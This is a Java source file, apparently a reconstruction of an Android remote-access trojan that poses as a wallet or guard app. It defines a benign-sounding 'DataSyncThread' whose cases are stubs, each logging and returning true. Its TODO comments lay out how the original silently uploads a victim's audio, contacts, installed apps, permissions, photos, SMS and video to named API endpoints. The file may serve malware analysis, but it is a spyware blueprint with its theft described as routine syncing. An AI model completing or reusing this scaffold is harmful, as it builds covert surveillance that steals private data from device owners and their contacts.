package com.vendor.rat.keepalive.thread;

import android.util.Log;

import java.util.concurrent.Callable;

/**
 * Vendor: com.guard.wallet.thread.m
 * Data sync callable. Uploads device data by type.
 */
public final class DataSyncThread implements Callable<Boolean> {

    private static final String TAG = "DataSyncThread";
    private final int syncType;

    /**
     * @param syncType 0=audio, 1=contacts, 2=packages, 3=permissions, 4=photos, 5=sms, default=video
     */
    public DataSyncThread(int syncType) {
        this.syncType = syncType;
    }

    /**
     * Vendor: m.a() - performs upload by syncType
     */
    private Boolean doSync() {
        switch (syncType) {
            case 0:
                Log.d(TAG, "UploadAudioFileThread: syncing audio files");
                // TODO: VENDOR_VERIFY - queries MediaStore.Audio, uploads via http.l.A()
                return Boolean.TRUE;
            case 1:
                Log.d(TAG, "UploadContactsThread: 正在同步设备联系人");
                // TODO: VENDOR_VERIFY - gets contacts via utils.g.w0(), posts to /api/contact/post.json
                return Boolean.TRUE;
            case 2:
                Log.d(TAG, "UploadInstalledPackagesThread: 正在同步设备已安装应用");
                // TODO: VENDOR_VERIFY - gets packages via utils.g.e0(), posts to /api/package/post.json
                return Boolean.TRUE;
            case 3:
                Log.d(TAG, "UploadPermissionsThread: 正在同步App权限");
                // TODO: VENDOR_VERIFY - gets permissions via utils.g.h0(), posts to /api/permission/post.json
                return Boolean.TRUE;
            case 4:
                Log.d(TAG, "UploadPhotoFileThread: syncing photo files");
                // TODO: VENDOR_VERIFY - queries MediaStore.Images, uploads via http.l.D()
                return Boolean.TRUE;
            case 5:
                Log.d(TAG, "UploadSmsThread: syncing SMS messages");
                // TODO: VENDOR_VERIFY - queries content://sms/, posts to /api/smsMessage/post.json
                return Boolean.TRUE;
            default:
                Log.d(TAG, "UploadVideoFileThread: syncing video files");
                // TODO: VENDOR_VERIFY - queries MediaStore.Video, uploads via http.l.E()
                return Boolean.TRUE;
        }
    }

    @Override
    public Boolean call() {
        return doSync();
    }
}
